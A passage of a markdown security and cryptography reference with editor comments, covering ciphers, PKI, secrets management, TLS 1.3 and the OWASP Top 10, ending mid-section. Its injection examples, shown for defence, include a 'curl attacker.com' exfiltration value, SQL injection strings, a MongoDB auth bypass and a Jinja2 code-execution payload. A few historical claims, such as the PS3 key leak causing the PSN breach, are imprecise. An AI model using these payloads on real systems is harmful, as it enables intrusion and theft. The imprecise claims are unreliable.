# Security & Cryptography — A Layered Reference

<!-- @editor[audience/P2]: No audience calibration at the top. This learner knows AES, RSA, PKI, Kerberos, and TLS 1.2 deeply from building secure Microsoft systems. The high-value sections are: modern cipher suite trade-offs (AES-GCM vs ChaCha20-Poly1305 decision), OWASP Top 10 in a cloud-native context (beyond the SQL injection they know cold), zero-trust architecture (BeyondCorp model vs old perimeter model), and supply chain security (SLSA/SBOM/Sigstore — all new territory). The file should signal which sections are "already know this, use as reference" vs "new territory." Currently reads uniformly, mixing noise with high-signal content. -->

## The Big Picture

Security is not a feature you bolt on. It is a property that must be designed in at every layer of the stack.

```
┌─────────────────────────────────────────────────────────────────────────┐
│  SECURITY DOMAINS                                                       │
│                                                                         │
│  Cryptography          Identity & Access        Network Security        │
│  ──────────────────    ──────────────────────   ──────────────────      │
│  Symmetric enc         AuthN / AuthZ            TLS 1.3 / mTLS         │
│  Asymmetric (EC/RSA)   OAuth2 / OIDC            Firewalls / NSG        │
│  Hashing / MAC         Zero-trust model         VPN / Private Link     │
│  KDFs (Argon2id)       Secrets management       DDoS mitigation        │
│  Key management        PIM / JIT access                                 │
│                                                                         │
│  Application Security  Supply Chain             Threat Modeling         │
│  ──────────────────    ─────────────────────    ──────────────────      │
│  OWASP Top 10          SBOM (CycloneDX/SPDX)   STRIDE                  │
│  Input validation      SLSA provenance levels   Attack trees            │
│  Injection → SQLi      Sigstore / Cosign        Data flow diagrams     │
│  SSRF / XXE / SSTI     Dependency scanning      PASTA model            │
│  Security headers      Secret scanning                                  │
│                                                                         │
│  Container & Cloud Security                                             │
│  ─────────────────────────────────────────────────────────────────      │
│  Image scanning        IAM least privilege      Managed Identity        │
│  Non-root containers   RBAC scoping             Seccomp / AppArmor     │
│  Distroless images     Conditional Access       PIM / JIT elevation    │
└─────────────────────────────────────────────────────────────────────────┘
```

Seven domains, one threat model. Every attack crosses at least one boundary. This guide maps the full terrain.

---

## 1. Cryptography Fundamentals

### The Taxonomy

```
Cryptographic primitives:

  Symmetric encryption          Asymmetric encryption         Hash functions
  ─────────────────────         ─────────────────────         ──────────────
  One key, encrypt+decrypt      Key pair: public/private       One-way
  Fast (hardware AES-NI)        Slow (math-intensive)          No key needed
  Can't exchange over open ch.  Can exchange publicly           Output fixed length
  AES-256-GCM ← use this        ECDH for key exchange          SHA-256, BLAKE3
                                RSA/ECDSA for signatures

  MAC / HMAC                    Key derivation functions
  ──────────────                ────────────────────────
  Authenticate message           Stretch weak key → strong key
  Requires shared key            Password → key (Argon2id)
  HMAC-SHA256, Poly1305          Shared secret → session keys (HKDF)
```

### Symmetric Encryption: AES

<!-- @editor[bridge/P2]: Missing an explicit AES-GCM vs ChaCha20-Poly1305 decision bridge. The file mentions both are TLS 1.3 cipher suites and that ChaCha20 is for devices without AES-NI, but doesn't give the practitioner-level decision table: when do you pick one over the other in your own code (not just in TLS)? The learner knows AES from building Azure Data Factory encryption pipelines — what they need is the "when to reach for ChaCha20 specifically" guidance and the hardware acceleration detection pattern. -->

AES (Advanced Encryption Standard) is a block cipher. Rijndael won the NIST competition in 2001. Key insight from the math: AES operates over GF(2^8) — polynomial arithmetic modulo an irreducible polynomial. The ByteSub step is the affine transformation in GF(2^8). You already know this algebra.

Block size: always 128 bits. Key sizes: 128, 192, or 256 bits. Use 256.

The **mode of operation** determines everything about security properties:

```
Modes of operation:

  ECB (Electronic Codebook)       ← NEVER USE
  ┌──────┐ ┌──────┐ ┌──────┐
  │block1│ │block2│ │block3│
  └──┬───┘ └──┬───┘ └──┬───┘
     │E(K)    │E(K)    │E(K)   Same plaintext → same ciphertext
     ▼        ▼        ▼       ECB of Linux Tux image reveals the penguin
  ┌──────┐ ┌──────┐ ┌──────┐   (the "ECB penguin" — demonstrates the flaw)
  │ciphr1│ │ciphr2│ │ciphr3│

  CBC (Cipher Block Chaining)     ← vulnerable to padding oracle attacks
  IV ──► XOR ──► E(K) ──► XOR ──► E(K) ──► ...
          ▲               ▲
        block1           block2
  IV must be random; if IV is predictable → BEAST attack

  CTR (Counter Mode)              ← stream cipher semantics, parallelizable
  Nonce+Counter ──► E(K) ──► XOR plaintext = ciphertext
  No padding needed; bit-flip attack possible (no authentication)

  GCM (Galois/Counter Mode)       ← USE THIS (AEAD)
  CTR encryption  +  GHASH authentication tag
  ┌─────────────────────────────────────────┐
  │ Ciphertext │  Auth Tag (128-bit GHASH)  │
  └─────────────────────────────────────────┘
  AEAD = Authenticated Encryption with Associated Data
  Encrypts + produces authentication tag in one pass
  Nonce: 96 bits, MUST be unique (never reuse nonce with same key)
  If nonce reused → both confidentiality and integrity collapse
```

**AES-256-GCM** is the standard choice for symmetric encryption in 2024+.

**ChaCha20-Poly1305**: stream cipher + MAC. TLS 1.3 cipher suite alongside AES-GCM. Better on devices without AES hardware acceleration (mobile, IoT). Designed by Bernstein. No timing side-channel risk because it avoids table lookups.

### Asymmetric Cryptography: RSA

<!-- @editor[audience/P2]: The RSA key generation derivation (choose primes p,q; n=pq; φ(n)=(p-1)(q-1); ed≡1 mod φ(n)) explains number theory that an MIT Math + TCS double major has taught in undergrad. This is reference noise for this learner — they know it cold. The file acknowledges "Euler's totient — you know this from number theory" which is correct; the rest of the derivation can be collapsed to one line. The valuable content here is the padding attack history (Bleichenbacher, OAEP) and the "prefer ECDSA over RSA" guidance — that's practitioner-level and correct. -->

RSA security rests on integer factorization hardness. Key pair generation:
- Choose primes p, q (1024+ bits each for 2048-bit key)
- n = pq (modulus)
- φ(n) = (p-1)(q-1) (Euler's totient — you know this from number theory)
- Public exponent e (typically 65537 = 2^16 + 1)
- Private exponent d: ed ≡ 1 (mod φ(n))
- Encrypt: c = m^e mod n; Decrypt: m = c^d mod n

Current guidance:
- 2048-bit: deprecated for new systems (still in use; breaks before ~2030 is speculative)
- 4096-bit: preferred for new RSA deployments
- For anything new, prefer ECDSA over RSA (shorter keys, same security level)

**Padding matters catastrophically:**

```
RSA padding schemes:

  PKCS#1 v1.5 (encryption)    ← DANGEROUS for encryption
  00 02 [non-zero random padding] 00 [message]
  Bleichenbacher 1998 attack: adaptive chosen ciphertext → decrypt without key
  Still appears in TLS 1.2 RSA key exchange (PKCS#1 v1.5) — why TLS 1.3 drops it

  OAEP (Optimal Asymmetric Encryption Padding)  ← USE for RSA encryption
  MGF1 mask generation, hash of label
  Secure against Bleichenbacher-style attacks

  PKCS#1 v1.5 (signatures)   ← still used but declining
  RSA-PSS                     ← preferred for new RSA signatures
  PSS uses randomized padding; harder to forge
```

### Asymmetric Cryptography: Elliptic Curves

EC cryptography operates over an abelian group whose elements are points on a curve y² = x³ + ax + b (mod p). The group operation is point addition with a specific geometric definition. The group is finite and cyclic (generated by a base point G). The **elliptic curve discrete logarithm problem (ECDLP)**: given P = kG, find k. No subexponential algorithm is known for general EC groups — this is why 256-bit EC keys match ~3072-bit RSA keys in security.

You know group theory from MIT. The structure here is an abelian group (Z_n for some n), not a field. The "scalar multiplication" kG is just repeated group operation — fast via double-and-add.

```
Common curves:

  Curve       Size    Use              Notes
  ─────────   ─────   ──────────────   ──────────────────────────────────
  P-256       256-bit ECDSA/ECDH       NIST curve; widely supported
  P-384       384-bit ECDSA/ECDH       Higher security margin; slower
  P-521       521-bit ECDSA/ECDH       Overkill for most uses
  X25519      255-bit ECDH only        Bernstein; faster; no patents; TLS 1.3
  Ed25519     255-bit Signing only     EdDSA; deterministic; preferred for new
  secp256k1   256-bit Bitcoin/Ethereum Bitcoin's curve; not in TLS
```

**ECDSA signature** = (r, s) pair:
- k = random nonce; R = kG; r = R.x mod n
- s = k⁻¹(hash(m) + r·d) mod n
- Verify: check that u₁G + u₂Q has x-coordinate = r

**The nonce k must be unique per signature.** This is not optional. Sony PS3 used a constant k in their ECDSA implementation. Hackers collected two signatures, observed same r (since r = kG.x and k was constant), solved for the private key using simple algebra: d = (s₁·k - hash(m₁)) / r mod n. The PlayStation Network breach followed. The lesson: k-reuse in ECDSA is catastrophic. This is why Ed25519 (EdDSA) uses deterministic nonce derivation: k = HMAC(private_key, message) — no randomness required, no k-reuse possible.

**X25519 vs Ed25519**: both use Curve25519, but different coordinate systems (Montgomery vs twisted Edwards) and different uses. X25519 is for key exchange (ECDH); Ed25519 is for signing. Do not mix them.

### Diffie-Hellman Key Exchange

<!-- @editor[audience/P3]: The g^a mod p DH derivation (Alice picks a, Bob picks b, shared = g^(ab) mod p) is first-principles number theory that this learner has known since MIT. The note "No efficient algorithm known for large prime p" is unnecessary for them. Keep the ECDHE / perfect forward secrecy explanation — that's the operationally important part and well-written. Consider trimming the DH derivation to 2 lines and expanding ECDHE's role in TLS 1.3 specifically (why 1.3 mandates it, the specific groups used). -->

The foundational insight: two parties can agree on a shared secret over a public channel without ever transmitting the secret.

```
DH key exchange:

  Public params: prime p, generator g (subgroup of Z_p*)

  Alice                             Bob
  ─────                             ───
  a = random                        b = random
  A = g^a mod p  ──── A ──────►     B = g^b mod p
                 ◄─── B ────────
  shared = B^a mod p                shared = A^b mod p
  = g^(ab) mod p                    = g^(ab) mod p    ✓

  Eavesdropper sees: g, p, A, B
  To get shared secret: must solve DLP (find a from A = g^a mod p)
  No efficient algorithm known for large prime p
```

**ECDHE** (Ephemeral Elliptic Curve DH): uses EC point multiplication instead of modular exponentiation. "Ephemeral" = new key pair generated per handshake. This gives **perfect forward secrecy (PFS)**: even if the server's long-term private key is compromised later, recorded past sessions cannot be decrypted because each session used a fresh ephemeral key. TLS 1.3 mandates ECDHE (or DHE) — there is no static RSA key exchange in TLS 1.3.

### Hash Functions

<!-- @editor[audience/P3]: Preimage resistance / second preimage resistance / collision resistance definitions are MIT 6.875 (cryptography) material — this learner knows the formal definitions and the birthday bound argument cold. The table of hash functions (MD5 broken, SHA-1 SHAttered, BLAKE3 fastest) is useful as a quick-reference cheat sheet. The length extension vulnerability explanation is genuinely useful (practical implication not always remembered). Consider collapsing the three formal definitions to a single line and keeping the table + length extension content. -->

Information-theoretic framing: a hash function h: {0,1}* → {0,1}^n should behave like a random oracle. Three security properties:
- **Preimage resistance**: given h(x), infeasible to find x (one-way function)
- **Second preimage resistance**: given x, infeasible to find x' ≠ x with h(x) = h(x')
- **Collision resistance**: infeasible to find any pair x ≠ x' with h(x) = h(x')

Collision resistance implies second preimage resistance (contrapositive). Birthday bound: expect collision after ~2^(n/2) evaluations — for SHA-256 that is 2^128, computationally infeasible.

| Function | Output | Security | Status | Use case |
|----------|--------|----------|--------|----------|
| MD5 | 128-bit | 2^18 collisions | BROKEN | Legacy verification only |
| SHA-1 | 160-bit | SHAttered (2017) | BROKEN | Legacy; git still uses but migrating |
| SHA-256 | 256-bit | 2^128 | Safe | General, TLS, certificates |
| SHA-384 | 384-bit | 2^192 | Safe | TLS 1.3 cipher suites |
| SHA-512 | 512-bit | 2^256 | Safe | When 512-bit output needed |
| SHA-3 (Keccak) | variable | 2^(n/2) | Safe | Sponge construction; post-quantum resistant design |
| BLAKE3 | variable | 2^(n/2) | Safe | Fastest; preferred for checksums, file verification |

SHA-2 family has a **length extension vulnerability**: H(key || message) is forgeable. If you know H(secret || data), you can compute H(secret || data || padding || extra) without knowing `secret`. This is because Merkle-Damgård construction exposes intermediate state. Solution: always use HMAC (see below), never concatenate key + message and hash.

SHA-3 (Keccak) uses a sponge construction — immune to length extension. BLAKE3 uses a tree structure — also immune, and much faster than SHA-2 in software.

### MAC and HMAC

A Message Authentication Code provides both integrity and authenticity — it requires knowing the key to produce or verify.

```
HMAC construction:
  HMAC(K, m) = H( (K ⊕ opad) || H( (K ⊕ ipad) || m ) )

  opad = 0x5c5c...5c (64 bytes)
  ipad = 0x3636...36 (64 bytes)

  The double-hash construction neutralizes the length extension attack:
  inner hash H(K⊕ipad || m) has a keyed boundary; outer hash re-keys the output
```

HMAC-SHA256 is the standard choice for message authentication.

**Poly1305**: fast MAC used with ChaCha20 in TLS 1.3. One-time MAC — key must not be reused. Uses polynomial evaluation over GF(2^130 - 5) (a prime field). Fast because it avoids table lookups.

**CMAC**: AES-based MAC for hardware/HSM contexts where you have AES acceleration but not SHA.

**Timing-safe comparison**: MAC tags and secrets must NEVER be compared with `==` or `memcmp`. These short-circuit on first differing byte, leaking timing information that can be used to forge MACs byte by byte. Always use constant-time comparison:
- .NET: `CryptographicOperations.FixedTimeEquals(a, b)`
- Node.js: `crypto.timingSafeEqual(a, b)`
- Python: `hmac.compare_digest(a, b)`

The timing side-channel was exploited against early HMAC implementations in web frameworks (Lucky Thirteen, Flickr, etc.).

### Key Derivation Functions

Passwords are low-entropy inputs. KDFs convert them into cryptographically strong keys while making brute-force expensive.

| KDF | Design | GPU resistance | OWASP rec | Notes |
|-----|--------|---------------|-----------|-------|
| PBKDF2 | HMAC iterations | Weak | Legacy | GPU-parallelizable; need 600,000+ iterations for SHA-256 |
| bcrypt | Blowfish-based | Moderate | Acceptable | Memory-hard (4KB); cost factor 12+; truncates at 72 bytes |
| scrypt | Memory-hard | Strong | Acceptable | N=2^17, r=8, p=1; memory-time tradeoff parameter |
| **Argon2id** | Memory+CPU hard | **Strongest** | **Preferred** | PHC 2015 winner; hybrid of Argon2i (side-channel) and Argon2d (GPU) |

**Argon2id minimum parameters** (OWASP 2024):
- `m = 64 MB` (memory cost)
- `t = 1` (time cost, iterations)
- `p = 4` (parallelism)
- Output length: 32 bytes minimum
- Salt: 16 bytes random per password

**HKDF** (HMAC-based Key Derivation Function, RFC 5869): not for passwords. Used to expand a shared secret (from ECDH) into multiple session keys. Two steps:
- Extract: `PRK = HMAC(salt, IKM)` — input key material to pseudorandom key
- Expand: `OKM = HMAC(PRK, info || counter)` — expand to needed length

TLS 1.3 uses HKDF throughout its key schedule to derive handshake keys, traffic keys, and resumption secrets from the ECDHE shared secret.

### Cryptographically Secure Random Numbers

Entropy source → OS CSPRNG → application random numbers.

```
Entropy collection (hardware events, timing jitter, /dev/random)
         │
         ▼
   OS CSPRNG pool (Linux: /dev/urandom / getrandom(); Windows: BCryptGenRandom)
         │
         ▼
   Application CSPRNG API:
     .NET:   RandomNumberGenerator.GetBytes(n)
     Node:   crypto.randomBytes(n)  ← NOT Math.random()
     Python: secrets.token_bytes(n) ← NOT random.random()
     Rust:   rand::thread_rng().fill_bytes()
```

`Math.random()` in JavaScript uses xorshift128+ — fast but predictable if you observe output. Never use for tokens, session IDs, keys, nonces, or anything security-relevant.

UUID v4 contains 122 bits of randomness (6 bits are version/variant markers). Birthday bound: expect first collision at ~2^61 UUIDs generated. For any realistic application, UUID v4 collision is negligible. But do not use UUID v4 as a password reset token if you are generating millions per second — use 256-bit random tokens instead.

**AES-GCM nonce**: 96-bit (12-byte) random nonce. Each (key, nonce) pair must be used at most once. At 2^32 random nonces per key, the birthday collision probability is ~2^(-33). In practice: derive nonces from a counter or use random + counter hybrid. If nonce collides in GCM, both confidentiality and the authentication tag are compromised.

---

<!-- @editor[content/P1]: Post-quantum cryptography is completely absent from this file. NIST finalized FIPS 203 (ML-KEM/Kyber), FIPS 204 (ML-DSA/Dilithium), and FIPS 205 (SLH-DSA/SPHINCS+) in August 2024. For a VP of Engineering at Microsoft who manages systems with 10+ year lifespans, the "harvest now, decrypt later" threat (adversaries collecting TLS traffic today to decrypt when quantum computers arrive) is operationally relevant now. Missing: a section on PQC migration timeline, which algorithms replace RSA/ECDSA/ECDH, and TLS 1.3's hybrid key exchange (X25519+Kyber768 — already deployed by Cloudflare and available in BoringSSL/OpenSSL 3.4). This is a P1 gap for a 2024+ reference. -->

## 2. PKI — Public Key Infrastructure

PKI is the trust hierarchy that lets clients verify they are talking to the right server.

```
Root CA (self-signed, offline in HSM, revocation is catastrophic)
  │
  └─► Intermediate CA (online, regularly rotated, signs end-entity certs)
            │
            └─► Leaf Certificate (your server cert)
                  │
                  ├── Subject: CN=api.example.com
                  ├── Subject Alternative Names (SAN):
                  │     DNS:api.example.com
                  │     DNS:www.example.com
                  ├── Public key: ECDSA P-256 or RSA 2048+
                  ├── Validity period: NotBefore / NotAfter
                  │     Let's Encrypt: 90 days
                  │     Traditional CAs: 398 days max (CA/Browser Forum)
                  ├── Key Usage: Digital Signature, Key Encipherment
                  ├── Extended Key Usage: TLS Web Server Authentication
                  ├── Authority Key Identifier (links to Intermediate)
                  ├── Subject Key Identifier
                  ├── CRL Distribution Points
                  ├── OCSP access location
                  ├── Certificate Transparency: SCT extension
                  └── Issuer signature (ECDSA/RSA, signed by Intermediate CA private key)
```

### X.509 Verification Chain

When your browser connects to `api.example.com`:
1. Server presents leaf cert + intermediate cert chain
2. Browser verifies leaf is signed by intermediate (check signature with intermediate public key)
3. Browser verifies intermediate is signed by a root CA in its trust store
4. Browser verifies hostname in leaf cert SAN matches the hostname it connected to
5. Browser verifies NotBefore ≤ now ≤ NotAfter
6. Browser checks revocation (CRL/OCSP)

The trust store (Windows Certificate Store, macOS Keychain, Mozilla NSS, system-provided on Linux) is the list of root CAs your system trusts. This is the root of the trust hierarchy. Compromise one trusted root CA → game over for that CA's cert space.

### Revocation: the Ugly Truth

```
Revocation methods:

  CRL (Certificate Revocation List):
  CA publishes a signed list of revoked serial numbers
  Problem: downloaded, cached, can be stale; large lists; "fail-open" if unavailable

  OCSP (Online Certificate Status Protocol):
  Client queries CA's OCSP responder: "is serial number X still valid?"
  Real-time; but: privacy (CA learns which sites you visit), latency

  OCSP Stapling:
  Server pre-fetches its own OCSP response, attaches ("staples") to TLS handshake
  Client doesn't need to contact CA directly
  Fixes privacy and latency; server refreshes staple before it expires

  OCSP Must-Staple (X509v3 extension):
  "I will always staple. If you don't see a staple, refuse the connection."
  Hard requirement; prevents downgrade where server skips stapling
```

### Certificate Transparency

All publicly-trusted certificates must be logged to one or more CT logs (RFC 6962). The CA submits the pre-certificate and gets a Signed Certificate Timestamp (SCT). The SCT is embedded in the certificate's extension. Browsers require valid SCTs. CT logs are append-only Merkle trees — any logged cert is permanently discoverable. This means:
- You can monitor CT logs for certificates issued for your domain (use crt.sh)
- Misissued certificates are discoverable within seconds of signing
- Google caught Symantec misissuing certificates via CT; Symantec's CA business was eventually wound down

### Let's Encrypt and ACME

ACME protocol (RFC 8555) automates the DV (Domain Validation) certificate lifecycle:

```
ACME flow:

  1. Client generates key pair, registers account with ACME CA
  2. Client requests cert for domain, ACME CA issues challenge:
       HTTP-01: GET /.well-known/acme-challenge/<token> must return proof
       DNS-01:  TXT record _acme-challenge.domain.com = <proof>
  3. Client completes challenge, ACME CA validates domain control
  4. Client submits CSR (Certificate Signing Request)
  5. ACME CA signs cert (90-day validity), client downloads
  6. certbot / acme.sh / Caddy built-in automates renewal every 60 days
```

Let's Encrypt issues ~3 million certs per day. Free. Automated. No organizational vetting. For OV (Organization Validation) or EV (Extended Validation) certs, you need a traditional CA and manual vetting — but Chrome removed the EV green bar in 2019; EV certs are no longer worth the cost for most organizations.

Azure App Service Managed Certificates: free, auto-renews, no ACME tooling needed. Binds to custom domain. Limitation: cannot use with on-premises resources or non-App-Service endpoints.

---

## 3. Secrets Management

The failure mode: secrets end up in version control. Once in git, they are effectively public — history is permanent, forks exist, and secret scanning bots watch everything.

```
Secret lifecycle:

  Generation → Storage → Distribution → Rotation → Revocation

  ANTI-PATTERN — hardcoded:
  ┌─────────────────────────────────────────────────┐
  │ const apiKey = "sk-prod-abc123...";             │
  │ // pushed to GitHub                              │
  │ // GitHub secret scanning alerts within seconds │
  │ // key is now in git history forever             │
  └─────────────────────────────────────────────────┘

  ANTI-PATTERN — .env in container:
  ┌─────────────────────────────────────────────────┐
  │ COPY .env /app/.env                             │
  │ // .env is now in an image layer                │
  │ // docker inspect reveals ENV vars               │
  │ // "docker history" reveals COPY layers          │
  └─────────────────────────────────────────────────┘

  CORRECT — runtime injection from vault:
  ┌────────────────┐   at startup   ┌──────────────┐
  │  Application   │ ─────────────► │  Key Vault / │
  │  (Managed ID)  │ ◄───────────── │    Vault     │
  └────────────────┘  short-lived   └──────────────┘
                       secret
  Secret never in code, image, or config file.
  Rotated by vault. Audited access.
```

### Environment Variables

Better than hardcoded. Still imperfect:
- Visible in `/proc/PID/environ` on Linux
- Dumped in crash reports, debug output, observability spans
- Not easily rotatable without restart
- Visible in `docker inspect` for running containers

Use environment variables for config that varies between environments (dev/staging/prod). For actual secrets (API keys, DB passwords, signing keys), use a vault and inject at runtime or use references (e.g., Azure Key Vault references in App Service config — the platform fetches the value; the app never sees the Key Vault URL).

### HashiCorp Vault

```
Vault architecture:

  ┌───────────────────────────────────────────────────────┐
  │  Vault Server                                         │
  │  ┌─────────────┐  ┌──────────────┐  ┌─────────────┐ │
  │  │  Auth       │  │  Secret      │  │  Audit      │ │
  │  │  Backends   │  │  Engines     │  │  Log        │ │
  │  │  ─────────  │  │  ──────────  │  │             │ │
  │  │  AppRole    │  │  KV v2       │  │  every req  │ │
  │  │  AWS IAM    │  │  Database    │  │  recorded   │ │
  │  │  Kubernetes │  │  AWS creds   │  │             │ │
  │  │  JWT/OIDC   │  │  Transit enc │  └─────────────┘ │
  │  └─────────────┘  └──────────────┘                   │
  │  Sealed at rest (Shamir secret sharing for unseal)   │
  └───────────────────────────────────────────────────────┘
```

Key concepts:
- **KV v2**: versioned key-value store. Keeps N previous versions. Soft delete.
- **Dynamic secrets**: Vault connects to a database, generates a short-lived credential on demand, revokes it when the lease expires. App gets `user_abc123` / `pass_xyz789` that exists for 1 hour then is automatically dropped.
- **Transit engine**: encryption as a service. App sends plaintext, Vault returns ciphertext. Key never leaves Vault. "Vault as an HSM" for apps that can't manage keys themselves.
- **Leases and TTLs**: every secret has a TTL. Vault revokes automatically. Apps must renew before expiry or re-request.
- **Auth backends**: how workloads prove identity to Vault. Kubernetes workloads use their service account JWT; AWS workloads use IAM roles; apps use AppRole (role_id + secret_id).

### Azure Key Vault

Three object types:
- **Keys**: RSA/EC key pairs, HSM-backed available. Used for signing, wrapping (encrypting) other keys, BYOK (bring your own key). Operations performed in Key Vault — private key material never exported if HSM-protected.
- **Secrets**: arbitrary name-value pairs. API keys, connection strings, passwords. Versioned. Soft delete.
- **Certificates**: X.509 certs with associated private keys. Handles Let's Encrypt renewal automatically when configured.

Access pattern:
```
Azure VM / App Service / AKS Pod
         │
         │ (no credentials needed — just identity)
         ▼
  Azure IMDS → Managed Identity token  ─────►  Azure AD
                                                     │
                                        validates token
                                                     │
                                                     ▼
                                         Azure Key Vault
                                         (RBAC: Key Vault Secrets User role)
                                                     │
                                              returns secret
```

This is the Azure equivalent of BeyondCorp workload identity: the workload authenticates via its platform identity (Managed Identity), which is verified by Entra ID, which grants access to Key Vault. No passwords. No credentials in config. Rotation is transparent.

Soft delete + purge protection: prevents accidental permanent deletion. Even after "delete," the secret persists in a soft-deleted state for the retention period (7-90 days) before permanent purge. Enable purge protection in production.

### SOPS and Sealed Secrets

**SOPS** (Secrets OPerationS by Mozilla): encrypt secret files in-place using KMS/PGP/age keys. The file structure (YAML/JSON keys) is preserved; only values are encrypted. Safe to commit to git.

```yaml
# SOPS-encrypted secrets.yaml — safe to commit
database_password: ENC[AES256_GCM,data:abc123...,tag:xyz...,type:str]
api_key: ENC[AES256_GCM,data:def456...,tag:uvw...,type:str]
sops:
    kms:
    -   arn: arn:aws:kms:us-east-1:123456789:key/abc-def-...
    azure_kv:
    -   vault_url: https://myvault.vault.azure.net
        name: sops-key
```

**Sealed Secrets** (Bitnami, for Kubernetes): a `SealedSecret` CRD that can only be decrypted by the Sealed Secrets controller running in the cluster. Encrypt with the cluster's public key; only the cluster can decrypt. Safe to store in git alongside k8s manifests.

### Secret Scanning

The assumption must be: secrets will leak into git. Defense:

| Tool | Integration | Scope |
|------|-------------|-------|
| GitHub secret scanning | Built-in (free for public, paid for private) | Push-time scan of new commits |
| gitleaks | Pre-commit hook, CI | Scan full git history |
| truffleHog | CI, standalone | Entropy + regex scan of history |
| git-secrets | Pre-commit hook | Block commits matching configured patterns |
| Semgrep secrets | CI | Source code + config file patterns |

Pre-commit is the right place for local blocking. CI is the backstop. GitHub secret scanning is the last line for anything that makes it to remote.

If a secret is confirmed leaked: rotate immediately, then remove from history if desired (BFG Repo Cleaner or `git filter-repo`). But assume the secret was captured by any bots watching push events — the rotation is what matters, not the history cleanup.

---

## 4. TLS in Depth

TLS 1.3 (RFC 8446) radically simplified the protocol compared to TLS 1.2.

```
TLS 1.3 handshake (1-RTT):

Client                                          Server
──────                                          ──────
ClientHello:
  - supported cipher suites
  - key_share: ECDHE public key (X25519)
  - supported_groups, signature_algorithms
                        ─────────────────►

                                        ServerHello:
                                          - chosen cipher suite
                                          - key_share: ECDHE public key
                                          {EncryptedExtensions}
                                          {Certificate}
                                          {CertificateVerify}
                                          {Finished}
                        ◄─────────────────

{Finished}
─────────────────────────────────────────►

[Application Data]  ◄──────────────────►  [Application Data]
```

Key properties of TLS 1.3:
- Always ECDHE (forward secrecy mandatory — no static RSA)
- Cipher suites reduced to 5 (all AEAD): AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305, AES-128-CCM, AES-128-CCM-8
- Server certificate encrypted in flight (SNI leaks hostname but cert itself hidden)
- 0-RTT resumption available (but replay-vulnerable — only for idempotent requests)
- SHA-1 and RC4 removed; RSA key exchange removed; CBC cipher suites removed

**mTLS** (mutual TLS): both client and server present certificates. The client must have a cert signed by a CA the server trusts. Used for service-to-service authentication in microservices (Istio/Linkerd handle this transparently via sidecar proxies).

---

## 5. OWASP Top 10 (2021) — Deep Dive

### A01: Broken Access Control

The most common critical vulnerability. Authorization failures are almost always server-side logic bugs, not crypto failures.

**IDOR (Insecure Direct Object Reference)**:
```
GET /api/orders/42                → user sees their order ✓
GET /api/orders/43                → user sees someone else's order ✗

The API trusts the ID in the URL without checking:
  "does the authenticated user own order 43?"
```

**Missing function-level access control**: frontend hides "Delete User" button from non-admins. Backend doesn't check role before executing `DELETE /api/users/123`. Attacker calls the endpoint directly.

**JWT claims manipulation**: server issues `{"sub": "user123", "role": "viewer"}`. If server doesn't cryptographically verify the JWT signature before trusting claims, attacker can modify `role` to `admin`.

**Prevention**:
- Default deny: unless a permission is explicitly granted, deny the request
- Server-side check on every request — authorization is not a frontend concern
- Use proven authorization libraries or frameworks (OPA, Casbin, Azure RBAC)
- Log access control failures; alert on volume spikes (they are often attack scans)

### A02: Cryptographic Failures

Previously called "Sensitive Data Exposure" — renamed to focus on root cause.

Failure modes:
- HTTP instead of HTTPS (no TLS)
- MD5 or SHA-1 for password hashing (trivially crackable with rainbow tables or GPU brute force)
- Storing plaintext passwords (yes, this still happens)
- Weak cipher suites: RC4, DES, 3DES, CBC without HMAC
- Hardcoded symmetric keys or IVs
- IV reuse in CBC or GCM
- Weak KDF: PBKDF2 with too few iterations, no salt

**Prevention**:
- HTTPS everywhere, HSTS header
- Argon2id for passwords
- AES-256-GCM for symmetric encryption
- TLS 1.2 minimum, 1.3 preferred; disable TLS 1.0 and 1.1
- Rotate keys; store keys separate from data

### A03: Injection

<!-- @editor[audience/P2]: The SQL injection example (SELECT * FROM users WHERE name = '" + userName) with the ' OR '1'='1 input is textbook material this learner has known for 20+ years and likely reviewed in code reviews at Microsoft. The parameterized query remedy is equally obvious. What's NOT obvious and worth covering: NoSQL injection (MongoDB $gt operator bypass shown below is good), SSTI (shown, good), and GraphQL injection patterns (missing — a modern blind spot). Consider trimming the SQL injection walkthrough to 2 lines and expanding the less-obvious injection vectors. -->

**SQL injection** — the classic:
```sql
-- Vulnerable:
query = "SELECT * FROM users WHERE name = '" + userName + "'";
-- Input: ' OR '1'='1
-- Executes: SELECT * FROM users WHERE name = '' OR '1'='1'
-- Returns: all users

-- Also: input = "'; DROP TABLE users; --"

-- Correct: parameterized query
SELECT * FROM users WHERE name = @name
-- Parameter binding handled by driver; SQL and data are separate
```

**Command injection**:
```javascript
// Vulnerable:
exec("convert " + userFile + " output.png");
// Input: "input.jpg; curl attacker.com/$(cat /etc/passwd)"

// Correct:
execFile("convert", [userFile, "output.png"]);
// Or: use library APIs that don't invoke shell
```

**NoSQL injection** (MongoDB):
```javascript
// Vulnerable:
db.users.find({ username: req.body.username, password: req.body.password })
// Input: { "username": "admin", "password": { "$gt": "" } }
// The $gt operator matches any non-empty string — auth bypass

// Correct: validate that inputs are strings; use schema validation
```

**SSTI (Server-Side Template Injection)**:
```
// Vulnerable — Jinja2:
template.render("Hello " + user_input)
// Input: {{ 7*7 }} → "Hello 49"
// Input: {{ config.items() }} → leaks app config
// Input: {{ ''.__class__.__mro__[2].__subclasses__() }} → code execution
```

Prevention: parameterized queries for databases (always), whitelist input validation, avoid dynamic template rendering from user input.

### A04: Insecure Design

Root cause: security not considered during design. Not a code bug — an architecture bug.

Examples:
- Password reset that sends the current password in plaintext email (implies passwords stored reversibly)
- Business logic flaw: coupon codes can be applied multiple times because the "used" flag is checked before order completion, not after
- Race condition: two concurrent requests both pass a "balance sufficient" check, both deduct, result is negative balance (classic TOCTOU — time of check, time of use)
- Secret questions for account recovery that can be guessed from social media

Prevention: threat modeling during design (STRIDE — see Section 8). Security user stories. Abuse cases alongside use cases.

### A05: Security Misconfiguration

```
Common misconfigurations:

  Default credentials:
    admin/admin, admin/password, postgres/postgres
    Scanner bots probe every new IP within minutes of assignment

  Debug endpoints in production:
    /actuator (Spring Boot), /_debug (various), /phpinfo.php
    Leak: stack traces, env vars, memory dumps, internal IPs

  Verbose error messages:
    "SQLException: duplicate key value violates unique constraint 'users_email_key'"
    Reveals: database type, schema structure

  Security headers missing:
    Strict-Transport-Security    (HSTS — prevents SSL stripping)
    Content-Security-Policy      (prevents XSS)
    X-Content-Type-Options       (prevents MIME sniffing)
    X-Frame-Options              (prevents clickjacking)

  Storage misconfiguration:
    S3 bucket or Azure Blob container with public read access
    Exposed database ports (MongoDB 27017, Redis 6379) with no auth

  CORS misconfiguration:
